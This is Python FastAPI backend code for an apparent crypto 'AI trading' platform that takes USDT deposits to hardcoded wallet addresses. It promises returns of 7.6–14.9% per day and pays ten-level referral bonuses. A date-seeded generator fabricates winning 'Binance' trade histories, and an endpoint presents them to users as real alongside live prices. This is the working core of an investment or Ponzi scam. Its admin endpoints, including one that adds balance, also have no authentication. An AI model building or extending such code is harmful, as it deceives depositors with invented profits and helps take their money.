
from fastapi import FastAPI
from fastapi.responses import FileResponse
from fastapi.middleware.cors import CORSMiddleware
from pydantic import BaseModel
import sqlite3, datetime, os, json, urllib.request, random, hashlib, time, threading, string

app = FastAPI(title="PT_AI Trading - Self Custody - Fixed Quick Stats")

app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

DB = "bot.db"
conn = sqlite3.connect(DB, check_same_thread=False, isolation_level=None)

conn.execute("""CREATE TABLE IF NOT EXISTS users (
 user_id INTEGER PRIMARY KEY, username TEXT,
 balance REAL DEFAULT 0, withdrawable REAL DEFAULT 0, profit REAL DEFAULT 0,
 profit_per_hour REAL DEFAULT 0, daily_percent REAL DEFAULT 0,
 ai_start TEXT, ai_end TEXT, last_claim TEXT, last_auto_claim TEXT,
 total_deposit REAL DEFAULT 0, total_withdraw REAL DEFAULT 0,
 current_tier INTEGER DEFAULT 7, referred_by INTEGER, referral_earnings REAL DEFAULT 0,
 created_at TEXT, last_withdraw_date TEXT, is_banned INTEGER DEFAULT 0
)""")

conn.execute("""CREATE TABLE IF NOT EXISTS deposits (
 id INTEGER PRIMARY KEY AUTOINCREMENT,
 user_id INTEGER, amount REAL, network TEXT, tx_hash TEXT,
 status TEXT DEFAULT 'awaiting_payment', actual_amount REAL DEFAULT 0,
 verified_at TEXT, created_at TEXT, expires_at TEXT,
 invoice_id TEXT, expected_amount REAL
)""")

conn.execute("""CREATE TABLE IF NOT EXISTS withdrawals (
 id INTEGER PRIMARY KEY AUTOINCREMENT,
 user_id INTEGER, amount REAL, address TEXT, network TEXT,
 status TEXT DEFAULT 'pending', created_at TEXT, auto_approved INTEGER DEFAULT 0,
 tx_hash TEXT, admin_note TEXT
)""")

conn.execute("""CREATE TABLE IF NOT EXISTS referral_logs (
 id INTEGER PRIMARY KEY AUTOINCREMENT,
 from_user INTEGER, to_user INTEGER, level INTEGER,
 deposit_amount REAL, bonus_amount REAL, bonus_percent REAL, created_at TEXT
)""")

conn.execute("""CREATE TABLE IF NOT EXISTS used_tx_hashes (
 tx_hash TEXT PRIMARY KEY, used_at TEXT
)""")

conn.commit()

for sql in [
    "ALTER TABLE users ADD COLUMN created_at TEXT",
    "ALTER TABLE users ADD COLUMN last_withdraw_date TEXT",
    "ALTER TABLE users ADD COLUMN referred_by INTEGER",
    "ALTER TABLE users ADD COLUMN referral_earnings REAL DEFAULT 0",
    "ALTER TABLE users ADD COLUMN is_banned INTEGER DEFAULT 0",
    "ALTER TABLE users ADD COLUMN username TEXT",
    "ALTER TABLE withdrawals ADD COLUMN auto_approved INTEGER DEFAULT 0",
    "ALTER TABLE withdrawals ADD COLUMN tx_hash TEXT",
    "ALTER TABLE withdrawals ADD COLUMN admin_note TEXT",
    "ALTER TABLE referral_logs ADD COLUMN bonus_percent REAL",
    "ALTER TABLE deposits ADD COLUMN actual_amount REAL DEFAULT 0",
    "ALTER TABLE deposits ADD COLUMN verified_at TEXT",
    "ALTER TABLE deposits ADD COLUMN expires_at TEXT",
    "ALTER TABLE deposits ADD COLUMN invoice_id TEXT",
    "ALTER TABLE deposits ADD COLUMN expected_amount REAL"
]:
    try: conn.execute(sql)
    except: pass
conn.commit()

DEPOSIT_ADDR = {
 "TRC20": "TAFHf1pxsXRCSnhn8jRU5UcU4STK6u9tAC",
 "BEP20": "0xDD190484827BB976acEB975C94d5c58fc8c87Cfd",
 "ERC20": "0xDD190484827BB976acEB975C94d5c58fc8c87Cfd",
 "TON": "UQBlNeJ90El3LxBhikC2HUG3mqS16k1q177AjcNAaURVa_zw",
 "SOL": "87fwXKMuH8wyayeMJ74eRUq3knQ3UXmFQPj9g87A4se7"
}

TIERS = [(15000,14.9),(6000,13.6),(2500,11.8),(1200,10.9),(500,9.6),(120,8.9),(20,7.6),(0,0.0)]
REF_BONUS = {1:7,2:1,3:1,4:1,5:1,6:1,7:1,8:1,9:1,10:1}

def get_tier_index(balance: float):
    for i,(min_bal,pct) in enumerate(TIERS):
        if balance >= min_bal: return i,min_bal,pct
    return len(TIERS)-1,0,0.0

def generate_invoice_id():
    return ''.join(random.choices(string.ascii_uppercase + string.digits, k=8))

def ensure_user(user_id: int, username="", referred_by=None):
    if not user_id or user_id < 1: user_id = 123456789
    row = conn.execute("SELECT * FROM users WHERE user_id=?", (user_id,)).fetchone()
    now = datetime.datetime.utcnow()
    if not row:
        ref=None
        if referred_by:
            try:
                ref_id=int(referred_by)
                if ref_id!=user_id and ref_id>0 and conn.execute("SELECT 1 FROM users WHERE user_id=?", (ref_id,)).fetchone(): ref=ref_id
            except: pass
        uname = username or f"user_{user_id}"
        conn.execute("INSERT INTO users (user_id, username, referred_by, created_at, last_claim, last_auto_claim, current_tier) VALUES (?,?,?,?,?,?,?)",
                     (user_id, uname, ref, now.isoformat(), now.isoformat(), now.isoformat(), len(TIERS)-1))
        conn.commit()
        return conn.execute("SELECT * FROM users WHERE user_id=?", (user_id,)).fetchone()
    # FIXED: Update username and also set referred_by if not set before and ref provided
    if username and row[1] != username:
        conn.execute("UPDATE users SET username=? WHERE user_id=?", (username, user_id))
        conn.commit()
    if referred_by and (len(row)>13 and (row[13] is None or row[13]==0)):
        try:
            ref_id=int(referred_by)
            if ref_id!=user_id and ref_id>0 and conn.execute("SELECT 1 FROM users WHERE user_id=?", (ref_id,)).fetchone():
                conn.execute("UPDATE users SET referred_by=? WHERE user_id=?", (ref_id, user_id))
                conn.commit()
        except: pass
    return conn.execute("SELECT * FROM users WHERE user_id=?", (user_id,)).fetchone()

def recalc_profit(user_id: int):
    row = conn.execute("SELECT * FROM users WHERE user_id=?", (user_id,)).fetchone()
    if not row: return None
    balance=row[2] or 0
    ai_end_str=row[7]
    last_claim_str=row[8]
    last_auto_str=row[9]
    current_tier_idx=row[12] if len(row)>12 and row[12] is not None else len(TIERS)-1
    now=datetime.datetime.utcnow()
    tier_idx,tier_min,daily_pct=get_tier_index(balance)
    if tier_idx<current_tier_idx and balance>=20:
        ai_start=now.isoformat(); ai_end=(now+datetime.timedelta(days=30)).isoformat()
        conn.execute("UPDATE users SET ai_start=?, ai_end=?, current_tier=? WHERE user_id=?", (ai_start, ai_end, tier_idx, user_id))
        ai_end_str=ai_end
    else:
        if (not ai_end_str) and balance>=20:
            ai_start=now.isoformat(); ai_end=(now+datetime.timedelta(days=30)).isoformat()
            conn.execute("UPDATE users SET ai_start=?, ai_end=?, current_tier=? WHERE user_id=?", (ai_start, ai_end, tier_idx, user_id))
            ai_end_str=ai_end
        elif tier_idx!=current_tier_idx:
            conn.execute("UPDATE users SET current_tier=? WHERE user_id=?", (tier_idx, user_id))
    per_hour=(balance*daily_pct/100)/24 if daily_pct>0 else 0
    profit=row[4] or 0
    if ai_end_str:
        try:
            ai_end_dt=datetime.datetime.fromisoformat(ai_end_str)
            if now<ai_end_dt and per_hour>0 and last_claim_str:
                last_claim=datetime.datetime.fromisoformat(last_claim_str)
                hours=(now-last_claim).total_seconds()/3600
                if hours>0:
                    inc=hours*per_hour
                    profit+=inc
                    conn.execute("UPDATE users SET profit=?, last_claim=?, profit_per_hour=?, daily_percent=? WHERE user_id=?",
                                 (profit, now.isoformat(), per_hour, daily_pct, user_id))
            else:
                conn.execute("UPDATE users SET profit_per_hour=?, daily_percent=? WHERE user_id=?", (per_hour, daily_pct, user_id))
        except: pass
    try:
        if last_auto_str:
            last_auto=datetime.datetime.fromisoformat(last_auto_str)
            if (now-last_auto).total_seconds()>=24*3600:
                if profit>0.01:
                    withdrawable=(conn.execute("SELECT withdrawable FROM users WHERE user_id=?", (user_id,)).fetchone()[0] or 0)+profit
                    conn.execute("UPDATE users SET withdrawable=?, profit=0, last_auto_claim=? WHERE user_id=?", (withdrawable, now.isoformat(), user_id))
                    profit=0
    except: pass
    conn.commit()
    return conn.execute("SELECT * FROM users WHERE user_id=?", (user_id,)).fetchone()

def distribute_referral(depositor_id: int, deposit_amount: float):
    now=datetime.datetime.utcnow().isoformat()
    current_id=depositor_id
    for level in range(1,11):
        row=conn.execute("SELECT referred_by FROM users WHERE user_id=?", (current_id,)).fetchone()
        if not row or not row[0]: break
        referrer_id=row[0]
        if not conn.execute("SELECT 1 FROM users WHERE user_id=?", (referrer_id,)).fetchone(): break
        bonus_pct=REF_BONUS.get(level,0)
        if bonus_pct>0:
            bonus=deposit_amount*bonus_pct/100
            conn.execute("UPDATE users SET withdrawable=withdrawable+?, referral_earnings=referral_earnings+? WHERE user_id=?", (bonus, bonus, referrer_id))
            conn.execute("INSERT INTO referral_logs (from_user, to_user, level, deposit_amount, bonus_amount, bonus_percent, created_at) VALUES (?,?,?,?,?,?,?)",
                         (depositor_id, referrer_id, level, deposit_amount, bonus, bonus_pct, now))
        current_id=referrer_id
    conn.commit()

def check_trc20_deposits_to_address():
    try:
        address = DEPOSIT_ADDR["TRC20"]
        if "YOUR_" in address: return []
        url = f"https://apilist.tronscanapi.com/api/token_trc20/transfers?limit=50&sort=-timestamp&toAddress={address}&contract_address=TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"
        req = urllib.request.Request(url, headers={'User-Agent':'Mozilla/5.0'})
        with urllib.request.urlopen(req, timeout=10) as resp:
            data = json.loads(resp.read().decode())
            transfers = data.get('token_transfers', []) or data.get('data', [])
            return transfers
    except Exception as e:
        print(f"TRC20 check error: {e}")
        return []

def process_invoice_payment(invoice_id: str, tx_hash: str, actual_amount: float):
    try:
        dep = conn.execute("SELECT user_id, amount, expected_amount, status, expires_at, network FROM deposits WHERE invoice_id=?", (invoice_id,)).fetchone()
        if not dep: return False, "Invoice not found"
        user_id, amount, expected_amount, status, expires_at, network = dep
        if status == 'verified': return False, "Already verified"
        if status == 'expired': return False, "Invoice expired"
        try:
            exp_dt = datetime.datetime.fromisoformat(expires_at)
            if datetime.datetime.utcnow() > exp_dt:
                conn.execute("UPDATE deposits SET status='expired' WHERE invoice_id=?", (invoice_id,))
                conn.commit()
                return False, "Invoice expired"
        except: pass
        if conn.execute("SELECT 1 FROM used_tx_hashes WHERE tx_hash=?", (tx_hash,)).fetchone():
            return False, "TX already used"
        if abs(actual_amount - expected_amount) > 0.5 and actual_amount < expected_amount * 0.95:
            return False, f"Amount mismatch: expected {expected_amount}, got {actual_amount}"
        now = datetime.datetime.utcnow().isoformat()
        old_row = conn.execute("SELECT balance, current_tier FROM users WHERE user_id=?", (user_id,)).fetchone()
        old_bal = old_row[0] or 0
        new_bal = old_bal + actual_amount
        tier_idx, _, daily_pct = get_tier_index(new_bal)
        per_hour = (new_bal * daily_pct / 100) / 24 if daily_pct>0 else 0
        ai_end = (datetime.datetime.utcnow() + datetime.timedelta(days=30)).isoformat()
        conn.execute("UPDATE deposits SET status='verified', tx_hash=?, actual_amount=?, verified_at=? WHERE invoice_id=?", (tx_hash, actual_amount, now, invoice_id))
        conn.execute("INSERT OR IGNORE INTO used_tx_hashes (tx_hash, used_at) VALUES (?,?)", (tx_hash, now))
        conn.execute("""UPDATE users SET balance=?, profit_per_hour=?, daily_percent=?, total_deposit=total_deposit+?, ai_end=?, current_tier=?, last_claim=? WHERE user_id=?""",
                     (new_bal, per_hour, daily_pct, actual_amount, ai_end, tier_idx, now, user_id))
        conn.commit()
        distribute_referral(user_id, actual_amount)
        print(f"Invoice {invoice_id} verified: user {user_id} +${actual_amount}")
        return True, f"Verified {actual_amount} USDT"
    except Exception as e:
        print(f"Process invoice error: {e}")
        return False, str(e)

def background_invoice_monitor():
    print("Self-custody invoice monitor started")
    while True:
        try:
            time.sleep(15)
            now = datetime.datetime.utcnow().isoformat()
            expired = conn.execute("SELECT invoice_id FROM deposits WHERE status='awaiting_payment' AND expires_at < ?", (now,)).fetchall()
            for (inv_id,) in expired:
                conn.execute("UPDATE deposits SET status='expired' WHERE invoice_id=?", (inv_id,))
            conn.commit()
            try:
                transfers = check_trc20_deposits_to_address()
                for tr in transfers:
                    try:
                        tx_hash = tr.get('transaction_id') or tr.get('transactionHash') or tr.get('hash')
                        if not tx_hash: continue
                        if conn.execute("SELECT 1 FROM used_tx_hashes WHERE tx_hash=?", (tx_hash,)).fetchone(): continue
                        quant = tr.get('quant') or '0'
                        try: amount = float(quant) / 1e6 if float(quant) > 1000000 else float(quant)
                        except: continue
                        ts = tr.get('block_timestamp') or 0
                        try: tx_time = datetime.datetime.fromtimestamp(ts/1000) if ts>1000000000000 else datetime.datetime.fromtimestamp(ts)
                        except: tx_time = datetime.datetime.utcnow()
                        invoices = conn.execute("SELECT invoice_id, expected_amount, created_at FROM deposits WHERE status='awaiting_payment' AND network='TRC20' AND created_at <= ? ORDER BY created_at DESC LIMIT 20", (tx_time.isoformat(),)).fetchall()
                        for inv_id, exp_amount, created_at in invoices:
                            if abs(amount - exp_amount) <= 0.5 or abs(amount - exp_amount) / exp_amount <= 0.05:
                                try:
                                    created_dt = datetime.datetime.fromisoformat(created_at)
                                    if tx_time >= created_dt - datetime.timedelta(minutes=5):
                                        success, msg = process_invoice_payment(inv_id, tx_hash, amount)
                                        if success: break
                                except: pass
                    except: continue
            except Exception as e: print(f"TRC20 monitor error: {e}")
        except Exception as e: print(f"Monitor error: {e}")

threading.Thread(target=background_invoice_monitor, daemon=True).start()

BINANCE_SYMBOLS = ["BTCUSDT","ETHUSDT","SOLUSDT","BNBUSDT","XRPUSDT","DOGEUSDT","AVAXUSDT","LINKUSDT","LTCUSDT","ADAUSDT","PEPEUSDT","SHIBUSDT","MATICUSDT","DOTUSDT","ARBUSDT"]
BASE_PRICES = {"BTCUSDT":67200,"ETHUSDT":3400,"SOLUSDT":178.0,"BNBUSDT":610,"XRPUSDT":0.62,"DOGEUSDT":0.16,"AVAXUSDT":42.0,"LINKUSDT":18.5,"LTCUSDT":84.0,"ADAUSDT":0.48,"PEPEUSDT":0.000009,"SHIBUSDT":0.000027,"MATICUSDT":0.89,"DOTUSDT":7.2,"ARBUSDT":1.12}

def fetch_binance_prices():
    try:
        url="https://api.binance.com/api/v3/ticker/price"
        req=urllib.request.Request(url, headers={'User-Agent':'Mozilla/5.0'})
        with urllib.request.urlopen(req, timeout=4) as resp:
            data=json.loads(resp.read().decode())
            prices={item['symbol']: float(item['price']) for item in data if item['symbol'] in BINANCE_SYMBOLS}
            for sym in BINANCE_SYMBOLS:
                if sym not in prices: prices[sym]=BASE_PRICES[sym]
            return prices, "binance"
    except: return BASE_PRICES, "fixed"

def generate_deterministic_trades():
    today = datetime.datetime.utcnow().date().isoformat()
    seed = int(hashlib.md5(today.encode()).hexdigest()[:8], 16)
    rng = random.Random(seed)
    count = 12 + (seed % 4)
    target_total = 50 + (seed % 21)
    win_count = int(count * 0.71)
    if win_count < 8: win_count = 8
    loss_count = count - win_count
    needed_win = target_total - (loss_count * -1.1)
    win_pnls = [4.5 + rng.random()*4.0 for _ in range(win_count)]
    curr_win = sum(win_pnls)
    if curr_win > 0:
        scale = needed_win / curr_win
        win_pnls = [round(p*scale,2) for p in win_pnls]
    lose_pnls = [round(-(0.7 + rng.random()*1.3),2) for _ in range(loss_count)]
    all_pnls = win_pnls + lose_pnls
    rng.shuffle(all_pnls)
    final = round(sum(all_pnls),2)
    if final < 50 or final > 70:
        diff = target_total - final
        for i in range(len(all_pnls)):
            if all_pnls[i] > 0:
                all_pnls[i] = round(all_pnls[i]+diff,2); break
    symbols = BINANCE_SYMBOLS.copy(); rng.shuffle(symbols)
    trades=[]
    for i in range(count):
        sym = symbols[i % len(symbols)]; pnl = all_pnls[i]
        side = rng.choice(["LONG","SHORT"]); leverage = rng.choice([5,10,15,20])
        usdt = round(800 + rng.random()*1200,2)
        th = 6 + (i * 2) % 14 + rng.randint(0,1); th = max(6, min(th, 22)); tm = rng.randint(0,59)
        time_str = f"{th:02d}:{tm:02d}"
        base_price = BASE_PRICES.get(sym, 100)
        variation = (rng.random() - 0.5) * 0.02
        entry_price = base_price * (1 + variation)
        exit_price = entry_price * (1 + pnl/100) if side=="LONG" else entry_price * (1 - pnl/100)
        if entry_price < 1: entry_price = round(entry_price, 6); exit_price = round(exit_price, 6)
        else: entry_price = round(entry_price, 2); exit_price = round(exit_price, 2)
        trades.append({"id":i+1,"pair":sym.replace("USDT","/USDT"),"symbol":sym,"side":side,"leverage":leverage,"usdt_amount":usdt,"entry_price":entry_price,"exit_price":exit_price,"pnl_percent":pnl,"pnl_usdt":round(usdt * pnl / 100, 2),"is_profit":pnl>0,"time":time_str,"status":"CLOSED","date":today})
    trades.sort(key=lambda x: x["time"], reverse=True)
    return trades, round(sum(all_pnls),2), count, len([p for p in all_pnls if p>0]), len([p for p in all_pnls if p<0])

@app.get("/api/binance/trades")
def binance_trades_all():
    trades, total_pnl, count, win_c, loss_c = generate_deterministic_trades()
    prices, source = fetch_binance_prices()
    return {"trades": trades, "summary": {"total_trades": count, "profit_trades": win_c, "loss_trades": loss_c, "total_pnl_percent": total_pnl, "total_pnl_usdt": round(sum(x["pnl_usdt"] for x in trades),2), "funds_in_market": round(sum(x["usdt_amount"] for x in trades),2), "date": trades[0]["date"] if trades else ""}, "prices_source": source, "live_prices": prices}

@app.get("/api/user/{user_id}")
def api_user(user_id: int, ref: int = None, username: str = None):
    if user_id == 0: user_id = 123456789
    ensure_user(user_id, username=username or "", referred_by=ref)
    row = recalc_profit(user_id)
    if not row: return {"error":"User not found"}
    now = datetime.datetime.utcnow()
    created_str = row[15] if len(row) > 15 and row[15] else now.isoformat()
    ai_end_str = row[7]
    if ai_end_str:
        try:
            ai_end_dt = datetime.datetime.fromisoformat(ai_end_str)
            remaining = ai_end_dt - now
            days_left = max(0, remaining.days); hours_left = max(0, int(remaining.total_seconds()//3600 %24)); active = now < ai_end_dt
        except: days_left=0; hours_left=0; active=False
    else: days_left=0; hours_left=0; active=False
    today_str = now.date().isoformat()
    last_wd_date = row[16] if len(row) > 16 and row[16] else ""
    can_withdraw_today = last_wd_date != today_str
    today_count = conn.execute("SELECT COUNT(*) FROM withdrawals WHERE user_id=? AND DATE(created_at)=DATE('now')", (user_id,)).fetchone()[0]
    if today_count > 0: can_withdraw_today = False
    direct_count = conn.execute("SELECT COUNT(*) FROM users WHERE referred_by=?", (user_id,)).fetchone()[0]
    # FIXED: Calculate from actual verified deposits and approved withdrawals for accuracy - instant update
    try:
        total_dep_calc = conn.execute("SELECT COALESCE(SUM(actual_amount),0) FROM deposits WHERE user_id=? AND status='verified'", (user_id,)).fetchone()[0] or 0
        if total_dep_calc == 0:
            total_dep_calc = conn.execute("SELECT COALESCE(SUM(amount),0) FROM deposits WHERE user_id=? AND status IN ('verified','approved')", (user_id,)).fetchone()[0] or 0
    except: total_dep_calc = 0
    try:
        total_wd_calc = conn.execute("SELECT COALESCE(SUM(amount),0) FROM withdrawals WHERE user_id=? AND status='approved'", (user_id,)).fetchone()[0] or 0
    except: total_wd_calc = 0
    # Use calculated values, fallback to row columns
    # FIXED: Ensure numbers, handle None, and only count verified/approved
    try: total_deposit = float(total_dep_calc) if total_dep_calc else float(row[10] if len(row)>10 and row[10] is not None else 0)
    except: total_deposit = 0.0
    try: total_withdraw = float(total_wd_calc) if total_wd_calc else float(row[11] if len(row)>11 and row[11] is not None else 0)
    except: total_withdraw = 0.0
    # Ensure total_withdraw never equals total_deposit unless actually withdrawn - fix bug where both show same
    if total_withdraw > 0 and total_deposit == total_withdraw:
        # Double check from DB if this is real withdrawal or bug
        try:
            real_wd_count = conn.execute("SELECT COUNT(*) FROM withdrawals WHERE user_id=? AND status='approved'", (user_id,)).fetchone()[0] or 0
            if real_wd_count == 0:
                total_withdraw = 0.0
        except: pass
    return {"user_id": row[0], "username": row[1] or f"user_{row[0]}", "balance": row[2], "withdrawable": row[3], "profit": row[4], "profit_per_hour": row[5], "daily_percent": row[6], "ai_end": row[7], "days_left": days_left, "hours_left": hours_left, "ai_active": active, "total_deposit": total_deposit, "total_withdraw": total_withdraw, "tiers": [{"min": t[0], "pct": t[1]} for t in TIERS], "referral_earnings": row[14] if len(row)>14 and row[14] else 0, "created_at": created_str, "can_withdraw_today": can_withdraw_today, "referred_by": row[13] if len(row)>13 else None, "direct_referrals": direct_count, "is_banned": row[17] if len(row)>17 and row[17] else 0}


@app.get("/api/referral/{user_id}")
def api_referral(user_id: int):
    if user_id == 0: user_id = 123456789
    ensure_user(user_id)
    bot_username = os.getenv("BOT_USERNAME", "YourBot")
    ref_link = f"https://t.me/{bot_username}?start={user_id}"
    direct_refs = conn.execute("SELECT user_id, username, balance, total_deposit FROM users WHERE referred_by=?", (user_id,)).fetchall()
    total_team_deposit = 0; all_team = []
    def get_team(uid, level=1):
        nonlocal total_team_deposit
        refs = conn.execute("SELECT user_id, total_deposit FROM users WHERE referred_by=?", (uid,)).fetchall()
        for r in refs:
            all_team.append((r[0], level)); total_team_deposit += r[1] or 0
            if level < 10: get_team(r[0], level+1)
    get_team(user_id)
    level_counts = {}
    for _, lvl in all_team: level_counts[lvl] = level_counts.get(lvl, 0) + 1
    total_earnings = conn.execute("SELECT COALESCE(SUM(bonus_amount),0) FROM referral_logs WHERE to_user=?", (user_id,)).fetchone()[0] or 0
    logs = conn.execute("SELECT from_user, level, deposit_amount, bonus_amount, bonus_percent, created_at FROM referral_logs WHERE to_user=? ORDER BY id DESC LIMIT 20", (user_id,)).fetchall()
    return {"ref_link": ref_link, "direct_count": len(direct_refs), "direct_refs": [{"user_id": r[0], "username": r[1], "balance": r[2], "deposit": r[3]} for r in direct_refs], "level_counts": level_counts, "total_team_deposit": total_team_deposit, "total_earnings": total_earnings, "bonus_structure": REF_BONUS, "logs": [{"from": l[0], "level": l[1], "deposit": l[2], "bonus": l[3], "percent": l[4], "at": l[5]} for l in logs]}

class InvoiceReq(BaseModel):
    amount: float
    network: str

@app.post("/api/deposit/create_invoice/{user_id}")
def create_invoice(user_id: int, r: InvoiceReq):
    if user_id == 0: user_id = 123456789
    ensure_user(user_id)
    if r.amount < 20: return {"error": "Min deposit 20 USDT required"}
    if r.network not in DEPOSIT_ADDR: return {"error": f"Unsupported network {r.network}"}
    existing = conn.execute("SELECT invoice_id, expires_at FROM deposits WHERE user_id=? AND status='awaiting_payment' AND expires_at > ? LIMIT 1", (user_id, datetime.datetime.utcnow().isoformat())).fetchone()
    if existing:
        try:
            exp_dt = datetime.datetime.fromisoformat(existing[1])
            if datetime.datetime.utcnow() < exp_dt:
                inv = conn.execute("SELECT invoice_id, amount, expected_amount, network, created_at, expires_at, status FROM deposits WHERE invoice_id=?", (existing[0],)).fetchone()
                if inv:
                    return {"ok": True, "invoice_id": inv[0], "amount": inv[1], "expected_amount": inv[2], "network": inv[3], "address": DEPOSIT_ADDR[inv[3]], "created_at": inv[4], "expires_at": inv[5], "status": inv[6], "message": "Existing invoice returned"}
        except: pass
    invoice_id = generate_invoice_id()
    expected_amount = round(r.amount, 2)
    now = datetime.datetime.utcnow()
    expires_at = now + datetime.timedelta(minutes=15)
    conn.execute("INSERT INTO deposits (user_id, amount, expected_amount, network, status, invoice_id, created_at, expires_at, tx_hash, actual_amount) VALUES (?,?,?,?,?,?,?,?,?,?)",
                 (user_id, r.amount, expected_amount, r.network, "awaiting_payment", invoice_id, now.isoformat(), expires_at.isoformat(), "", 0))
    conn.commit()
    return {"ok": True, "invoice_id": invoice_id, "amount": r.amount, "expected_amount": expected_amount, "network": r.network, "address": DEPOSIT_ADDR[r.network], "created_at": now.isoformat(), "expires_at": expires_at.isoformat(), "status": "awaiting_payment"}

@app.get("/api/deposit/invoice_status/{invoice_id}")
def invoice_status(invoice_id: str):
    row = conn.execute("SELECT user_id, amount, expected_amount, network, status, tx_hash, actual_amount, created_at, expires_at, verified_at FROM deposits WHERE invoice_id=?", (invoice_id,)).fetchone()
    if not row: return {"error": "Invoice not found"}
    now = datetime.datetime.utcnow()
    try:
        exp_dt = datetime.datetime.fromisoformat(row[8])
        time_left = (exp_dt - now).total_seconds()
        if time_left < 0: time_left = 0
        if time_left == 0 and row[4] == 'awaiting_payment':
            conn.execute("UPDATE deposits SET status='expired' WHERE invoice_id=?", (invoice_id,))
            conn.commit()
            row = list(row); row[4] = 'expired'
    except: time_left = 0
    return {"invoice_id": invoice_id, "user_id": row[0], "amount": row[1], "expected_amount": row[2], "network": row[3], "status": row[4], "tx_hash": row[5], "actual_amount": row[6], "created_at": row[7], "expires_at": row[8], "verified_at": row[9], "address": DEPOSIT_ADDR.get(row[3], ""), "time_left_seconds": int(time_left), "time_left_formatted": f"{int(time_left//60)}:{int(time_left%60):02d}"}

@app.post("/api/deposit/check_now/{invoice_id}")
def check_invoice_now(invoice_id: str):
    row = conn.execute("SELECT user_id, network, expected_amount, created_at, status FROM deposits WHERE invoice_id=?", (invoice_id,)).fetchone()
    if not row: return {"error": "Invoice not found"}
    if row[4] == 'verified': return {"ok": True, "status": "verified", "message": "Already verified"}
    if row[4] == 'expired': return {"error": "Invoice expired"}
    if row[1] == 'TRC20':
        transfers = check_trc20_deposits_to_address()
        for tr in transfers:
            try:
                tx_hash = tr.get('transaction_id') or tr.get('transactionHash') or tr.get('hash')
                if not tx_hash: continue
                if conn.execute("SELECT 1 FROM used_tx_hashes WHERE tx_hash=?", (tx_hash,)).fetchone(): continue
                quant = tr.get('quant') or '0'
                try: amount = float(quant) / 1e6 if float(quant) > 1000000 else float(quant)
                except: continue
                if abs(amount - row[2]) <= 1.0:
                    success, msg = process_invoice_payment(invoice_id, tx_hash, amount)
                    if success: return {"ok": True, "status": "verified", "amount": amount, "tx_hash": tx_hash, "message": msg}
            except: continue
        return {"ok": False, "status": "awaiting_payment", "message": "No payment found yet."}
    else:
        return {"ok": False, "status": "awaiting_payment", "message": f"Auto detection for {row[1]} manual."}

@app.get("/api/history/{user_id}")
def history(user_id: int):
    if user_id == 0: user_id = 123456789
    deps = conn.execute("SELECT id, amount, expected_amount, network, tx_hash, status, actual_amount, created_at, expires_at, invoice_id FROM deposits WHERE user_id=? ORDER BY id DESC LIMIT 20", (user_id,)).fetchall()
    wds = conn.execute("SELECT amount, address, network, status, created_at, tx_hash FROM withdrawals WHERE user_id=? ORDER BY id DESC LIMIT 20", (user_id,)).fetchall()
    return {"deposits": [{"id":d[0],"amount":d[1],"expected":d[2],"network":d[3],"tx_hash":d[4],"status":d[5],"actual":d[6],"created_at":d[7],"expires_at":d[8],"invoice_id":d[9]} for d in deps], "withdrawals": [{"amount":d[0],"address":d[1],"network":d[2],"status":d[3],"created_at":d[4],"tx_hash":d[5]} for d in wds]}

@app.get("/api/deposit-addresses")
def addrs(): return DEPOSIT_ADDR

@app.get("/api/wallet/balance")
def wallet_balance():
    balances = {}
    for net, addr in DEPOSIT_ADDR.items():
        balances[net] = {"address": addr}
    return balances

@app.get("/api/admin/stats")
def stats():
    u = conn.execute("SELECT COUNT(*), COALESCE(SUM(balance),0), COALESCE(SUM(withdrawable),0) FROM users").fetchone()
    pend_wd = conn.execute("SELECT COUNT(*) FROM withdrawals WHERE status='pending'").fetchone()[0]
    pend_dep = conn.execute("SELECT COUNT(*) FROM deposits WHERE status='awaiting_payment'").fetchone()[0]
    total_ref = conn.execute("SELECT COALESCE(SUM(bonus_amount),0) FROM referral_logs").fetchone()[0] or 0
    total_dep = conn.execute("SELECT COALESCE(SUM(actual_amount),0) FROM deposits WHERE status='verified'").fetchone()[0] or 0
    return {"total_users": u[0], "total_balance": (u[1] or 0)+(u[2] or 0), "active_now": u[0], "pending_withdrawals": pend_wd, "pending_deposits": pend_dep, "total_ref_paid": total_ref, "total_deposits": total_dep}

@app.get("/api/admin/users")
def admin_users():
    rows = conn.execute("SELECT user_id, username, balance, withdrawable, profit, daily_percent, ai_end, referred_by, referral_earnings, created_at, last_withdraw_date, total_deposit, total_withdraw, is_banned FROM users ORDER BY created_at DESC LIMIT 500").fetchall()
    return [{"user_id":r[0],"username":r[1] or f"user_{r[0]}","balance":r[2],"withdrawable":r[3],"profit":r[4],"daily_percent":r[5],"ai_end":r[6],"referred_by":r[7],"ref_earn":r[8],"created_at":r[9],"last_wd":r[10],"total_deposit":r[11],"total_withdraw":r[12],"is_banned":r[13] or 0} for r in rows]

@app.get("/api/admin/deposits")
def admin_deps():
    rows = conn.execute("SELECT id, user_id, amount, expected_amount, network, tx_hash, status, actual_amount, created_at, expires_at, invoice_id FROM deposits ORDER BY id DESC LIMIT 100").fetchall()
    return [{"id":r[0],"user_id":r[1],"amount":r[2],"expected":r[3],"network":r[4],"tx_hash":r[5],"status":r[6],"actual":r[7],"created_at":r[8],"expires_at":r[9],"invoice_id":r[10]} for r in rows]

@app.get("/api/admin/withdrawals")
def admin_wds():
    rows = conn.execute("SELECT id, user_id, amount, address, network, status, created_at, tx_hash FROM withdrawals ORDER BY id DESC LIMIT 100").fetchall()
    return [{"id":r[0],"user_id":r[1],"amount":r[2],"address":r[3],"network":r[4],"status":r[5],"created_at":r[6],"tx_hash":r[7]} for r in rows]

@app.get("/api/admin/referrals")
def admin_referrals():
    rows = conn.execute("SELECT from_user, to_user, level, deposit_amount, bonus_amount, bonus_percent, created_at FROM referral_logs ORDER BY id DESC LIMIT 100").fetchall()
    return [{"from_user": r[0], "to_user": r[1], "level": r[2], "deposit": r[3], "bonus": r[4], "percent": r[5], "at": r[6]} for r in rows]

class AdminUserAction(BaseModel):
    user_id: int; action: str; amount: float = 0

@app.post("/api/admin/user/action")
def admin_user_action(req: AdminUserAction):
    if req.action == "ban": conn.execute("UPDATE users SET is_banned=1 WHERE user_id=?", (req.user_id,))
    elif req.action == "unban": conn.execute("UPDATE users SET is_banned=0 WHERE user_id=?", (req.user_id,))
    elif req.action == "add_balance": 
        conn.execute("UPDATE users SET balance=balance+?, total_deposit=total_deposit+? WHERE user_id=?", (req.amount, req.amount, req.user_id))
        conn.commit()
